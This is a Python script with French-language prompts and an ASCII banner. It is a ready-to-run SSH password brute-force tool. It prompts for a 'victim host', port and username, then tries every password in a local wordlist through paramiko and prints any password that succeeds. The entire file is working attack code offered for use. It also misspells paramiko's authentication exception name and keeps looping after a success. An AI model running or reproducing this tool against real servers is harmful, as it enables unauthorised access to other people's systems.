import paramiko
import socket
import sys

def sshConnexion(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, username, password)
        erreur = 0
    except paramiko.AuthentificationException:
        erreur = 1
    except socket.error:
        erreur = 2
    ssh.close()
    return erreur

def bruteForce():
    host = input("\033[0;95mEntrez l'adresse de l'\033[0;92mHost victime \033[0;95m: \033[0;92m")
    port = int(input("\033[0;95mEntrez le \033[0;92mport \033[0;95m: \033[0;92m"))
    username = input("\033[0;95mEntrez le \033[0;92musername \033[0;95m:\033[0;92m ")
    try:
        wordlistPath = open("wordlist.txt",'r')
    except IOError:
        print("\n\033[0;95mImpossible d'ouvrir le \033[0;92mfichier !\033[0;95m")
    print("\n\033[0;95mLancement de l'\033[0;92mattaque\033[0;95m ...")
    print("\n\033[0;95mAttaque en cour par bruteforce de : \033[0;92mssh : //",username,"@",host,":",port, " \033[0;95m...")
    for x in wordlistPath.readlines():
        password = x.strip("\n")
        try:
            connexion = sshConnexion(host, port, username, password)
            if connexion == 0:
                print("\033[0;95mAttaque réussie, le mot de passe est :\033[0;92m", x)
            elif connexion == 1:
                pass
            elif connexion == 2:
                print("\033[0;95mImpossible de se connecter à l' \033[0;92mHost \033[0;95m:\033[0;92m", host)
                sys.exit(2)
        except Exception:
            pass
    print("\033[0;0m")
    wordlistPath.close()

def main():
    banner = """
    \033[0;95m  ___          _       ___               \033[0;92m___ ___ _  _ 
    \033[0;95m | _ )_ _ _  _| |_ ___| __|__ _ _ __ ___\033[0;92m/ __/ __| || |
    \033[0;95m | _ \ '_| || |  _/ -_) _/ _ \ '_/ _/ -_\033[0;92m)__ \__ \ __ |
    \033[0;95m |___/_|  \_,_|\__\___|_|\___/_| \__\___\033[0;92m|___/___/_||_|
                        \033[0;95mDev by \033[0;92mSword
                        \033[0;95mGithub : \033[0;92mhttps://github.com/SwordLoveDev

    """
    print(banner)
    bruteForce()
	
main()
	